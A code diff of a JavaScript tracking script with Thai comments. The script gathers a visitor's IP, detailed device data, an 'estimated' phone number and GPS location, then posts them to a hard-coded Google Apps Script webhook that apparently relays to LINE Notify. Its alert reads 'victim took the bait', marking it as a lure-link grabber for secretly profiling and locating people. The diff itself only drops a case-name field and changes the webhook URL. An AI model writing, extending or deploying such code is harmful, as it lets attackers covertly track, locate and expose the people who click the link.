@@ -3,14 +3,14 @@ function getUrlParameters() {
   try {
     const urlParams = new URLSearchParams(window.location.search);
     return {
-      trackingKey: urlParams.get('track') || "ไม่มีค่า",
-      caseName: urlParams.get('case') || "ไม่มีค่า"
+      trackingKey: urlParams.get('track') || "ไม่มีค่า"
+      // caseName: urlParams.get('case') || "ไม่มีค่า" // ลบการอ่าน caseName จาก URL
     };
   } catch (error) {
     console.error("ไม่สามารถดึงพารามิเตอร์จาก URL ได้:", error);
     return {
-      trackingKey: "ไม่มีค่า",
-      caseName: "ไม่มีค่า"
+      trackingKey: "ไม่มีค่า"
+      // caseName: "ไม่มีค่า"
     };
   }
 }
@@ -27,9 +27,9 @@ function getUrlParameters() {
     minute: '2-digit',
     second: '2-digit'
   });
-  
-  // ดึง tracking key และ case name จาก URL parameters
-  const { trackingKey, caseName } = getUrlParameters();
+
+  // ดึง tracking key จาก URL parameters (ไม่ต้องดึง caseName แล้ว)
+  const { trackingKey } = getUrlParameters();
 
   // เก็บข้อมูลอุปกรณ์แบบละเอียด
   const deviceInfo = getDetailedDeviceInfo();
@@ -62,26 +62,32 @@ function getUrlParameters() {
       .then(ipData => {
         // ตรวจสอบข้อมูลเบอร์โทรศัพท์ (หรือประมาณการณ์)
         estimatePhoneNumber().then(phoneInfo => {
-          // ส่งข้อมูลครั้งแรกทันทีพร้อม IP (ไม่มีพิกัด)
-          sendToLineNotify(ipData, "ไม่มีข้อมูล", timestamp, referrer, allDeviceData, phoneInfo, trackingKey, caseName);
+          // ส่งข้อมูลครั้งแรกทันทีพร้อม IP (ไม่มีพิกัด) - ไม่ต้องส่ง caseName
+          sendToLineNotify(ipData, "ไม่มีข้อมูล", timestamp, referrer, allDeviceData, phoneInfo, trackingKey);
 
-          // พยายามขอข้อมูลพิกัด (ถ้าผู้ใช้อนุญาต)
-          tryGetLocation(ipData, timestamp, referrer, allDeviceData, phoneInfo, trackingKey, caseName);
+          // พยายามขอข้อมูลพิกัด (ถ้าผู้ใช้อนุญาต) - ไม่ต้องส่ง caseName
+          tryGetLocation(ipData, timestamp, referrer, allDeviceData, phoneInfo, trackingKey);
         }).catch(phoneError => {
           console.error("ไม่สามารถประมาณการเบอร์โทรศัพท์ได้:", phoneError);
-          sendToLineNotify(ipData, "ไม่มีข้อมูล", timestamp, referrer, allDeviceData, null, trackingKey, caseName);
-          tryGetLocation(ipData, timestamp, referrer, allDeviceData, null, trackingKey, caseName);
+          // ส่งข้อมูลครั้งแรกทันทีพร้อม IP (ไม่มีพิกัด) - ไม่ต้องส่ง caseName
+          sendToLineNotify(ipData, "ไม่มีข้อมูล", timestamp, referrer, allDeviceData, null, trackingKey);
+          // พยายามขอข้อมูลพิกัด (ถ้าผู้ใช้อนุญาต) - ไม่ต้องส่ง caseName
+          tryGetLocation(ipData, timestamp, referrer, allDeviceData, null, trackingKey);
         });
       })
       .catch(error => {
         console.error("ไม่สามารถดึงข้อมูล IP ได้:", error);
         // ส่งข้อมูลโดยไม่มี IP
         estimatePhoneNumber().then(phoneInfo => {
-          sendToLineNotify({ip: "ไม่สามารถระบุได้"}, "ไม่มีข้อมูล", timestamp, referrer, allDeviceData, phoneInfo, trackingKey, caseName);
-          tryGetLocation({ip: "ไม่สามารถระบุได้"}, timestamp, referrer, allDeviceData, phoneInfo, trackingKey, caseName);
+          // ส่งข้อมูลครั้งแรกทันทีพร้อม IP (ไม่มีพิกัด) - ไม่ต้องส่ง caseName
+          sendToLineNotify({ip: "ไม่สามารถระบุได้"}, "ไม่มีข้อมูล", timestamp, referrer, allDeviceData, phoneInfo, trackingKey);
+          // พยายามขอข้อมูลพิกัด (ถ้าผู้ใช้อนุญาต) - ไม่ต้องส่ง caseName
+          tryGetLocation({ip: "ไม่สามารถระบุได้"}, timestamp, referrer, allDeviceData, phoneInfo, trackingKey);
         }).catch(() => {
-          sendToLineNotify({ip: "ไม่สามารถระบุได้"}, "ไม่มีข้อมูล", timestamp, referrer, allDeviceData, null, trackingKey, caseName);
-          tryGetLocation({ip: "ไม่สามารถระบุได้"}, timestamp, referrer, allDeviceData, null, trackingKey, caseName);
+          // ส่งข้อมูลครั้งแรกทันทีพร้อม IP (ไม่มีพิกัด) - ไม่ต้องส่ง caseName
+          sendToLineNotify({ip: "ไม่สามารถระบุได้"}, "ไม่มีข้อมูล", timestamp, referrer, allDeviceData, null, trackingKey);
+          // พยายามขอข้อมูลพิกัด (ถ้าผู้ใช้อนุญาต) - ไม่ต้องส่ง caseName
+          tryGetLocation({ip: "ไม่สามารถระบุได้"}, timestamp, referrer, allDeviceData, null, trackingKey);
         });
       });
   });
@@ -344,8 +350,8 @@ async function estimatePhoneNumber() {
   }
 }
 
-// ฟังก์ชันพยายามดึงข้อมูลตำแหน่ง
-function tryGetLocation(ipData, timestamp, referrer, deviceData, phoneInfo, trackingKey, caseName) {
+// ฟังก์ชันพยายามดึงข้อมูลตำแหน่ง - ไม่ต้องรับ caseName
+function tryGetLocation(ipData, timestamp, referrer, deviceData, phoneInfo, trackingKey) {
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
       function(position) {
@@ -360,8 +366,8 @@ function tryGetLocation(ipData, timestamp, referrer, deviceData, phoneInfo, trac
           gmapLink: `https://www.google.com/maps?q=${lat},${long}`
         };
 
-        // ส่งข้อมูลอีกครั้งพร้อมพิกัด
-        sendToLineNotify(ipData, locationData, timestamp, referrer, deviceData, phoneInfo, trackingKey, caseName);
+        // ส่งข้อมูลอีกครั้งพร้อมพิกัด - ไม่ต้องส่ง caseName
+        sendToLineNotify(ipData, locationData, timestamp, referrer, deviceData, phoneInfo, trackingKey);
       },
       function(error) {
         console.log("ผู้ใช้ไม่อนุญาตให้เข้าถึงตำแหน่ง:", error.message);
@@ -373,19 +379,16 @@ function tryGetLocation(ipData, timestamp, referrer, deviceData, phoneInfo, trac
       }
     );
   }
-}
-
-// ฟังก์ชันสร้างข้อความแจ้งเตือนแบบละเอียด
-function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInfo, trackingKey, caseName) {
+} // <-- Added missing closing brace for tryGetLocation function
+// ฟังก์ชันสร้างข้อความแจ้งเตือนแบบละเอียด - ไม่ต้องรับ caseName (จะถูกสร้างฝั่ง Server)
+// ฟังก์ชันนี้อาจจะไม่ถูกใช้งานแล้ว ถ้าข้อความถูกสร้างที่ Server ทั้งหมด
+// แต่เก็บไว้เผื่อกรณีต้องการสร้างข้อความพื้นฐานฝั่ง Client
+function createDetailedMessageClientSide(ipData, location, timestamp, deviceData, phoneInfo, trackingKey) {
   // ข้อความหลัก
   const message = [
-    "🎣แจ้งเตือนเหยื่อกินเบ็ด\n",
+    "🎣แจ้งเตือนเหยื่อกินเบ็ด (Client Fallback)\n", // ระบุว่าเป็น Fallback
     `⏰เวลา: ${timestamp}`,
   ];
-  // เพิ่มข้อมูล Case Name (ถ้ามี)
-  if (caseName && caseName !== "ไม่มีค่า") {
-    message.push(`📂ชื่อเคส: ${caseName}`);
-  }
   // เพิ่มข้อมูล Tracking Key (ถ้ามี)
   if (trackingKey && trackingKey !== "ไม่มีค่า") {
     message.push(`🔑Tracking Key: ${trackingKey}`);
@@ -458,28 +461,27 @@ function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInf
   }
 
   return message.join("\n");
-}
+} // <-- Added missing closing brace for createDetailedMessageClientSide function
+// ฟังก์ชันส่งข้อมูลไปยัง Google Apps Script Webhook - ไม่ต้องส่ง caseName
+function sendToLineNotify(ipData, location, timestamp, referrer, deviceData, phoneInfo, trackingKey) {
+  // ไม่ต้องสร้างข้อความละเอียดที่นี่แล้ว เพราะ Server จะสร้างให้โดย lookup caseName
+  // const detailedMessage = createDetailedMessageClientSide(ipData, location, timestamp, deviceData, phoneInfo, trackingKey);
 
-// ฟังก์ชันส่งข้อมูลไปยัง LINE Notify ผ่าน API
-function sendToLineNotify(ipData, location, timestamp, referrer, deviceData, phoneInfo, trackingKey, caseName) {
-  // สร้างข้อความละเอียด (ใช้ trackingKey และ caseName แยกกัน)
-  const detailedMessage = createDetailedMessage(ipData, location, timestamp, deviceData, phoneInfo, trackingKey, caseName);
-
-  // ส่งข้อมูลไปยัง webhook ของเรา (ที่ต่อกับ LINE Notify)
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbxBSNwlPZ4xdIFbdmdXsW6UxRDjTRREm4qkxhjguJGhRxFBcPyZ_C9A2OaRzc6sNtBT_A/exec';
+  // ส่งข้อมูลไปยัง webhook ของเรา
+  const webhookUrl = 'https://script.google.com/macros/s/AKfycbxwBq8LObp2lfv22PceRvHTW6US2Mpo__B_chyEfME3JYsgbdyj-z43XTMTyz4nZfb3uA/exec';
 
   // เตรียมข้อมูลสำหรับส่งไปยัง Google Apps Script
-  // ส่ง caseName และ trackingKey แยกกัน
+  // ไม่ต้องส่ง caseName หรือ message ที่สร้างจาก client แล้ว
   const dataToSend = {
-    message: detailedMessage, // ข้อความสำหรับ Line Notify (มี caseName และ trackingKey แยกกัน)
+    // message: detailedMessage, // ไม่ส่ง message ที่สร้างจาก client
     timestamp: timestamp,
     location: location,
     ip: ipData,
     deviceInfo: deviceData,
     phoneInfo: phoneInfo,
     referrer: referrer,
-    trackingKey: trackingKey, // ส่ง trackingKey เดิม
-    caseName: caseName      // ส่ง caseName เดิม
+    trackingKey: trackingKey // ส่ง trackingKey เท่านั้น
+    // caseName: caseName      // ไม่ส่ง caseName แล้ว
   };
 
   // ส่งข้อมูล
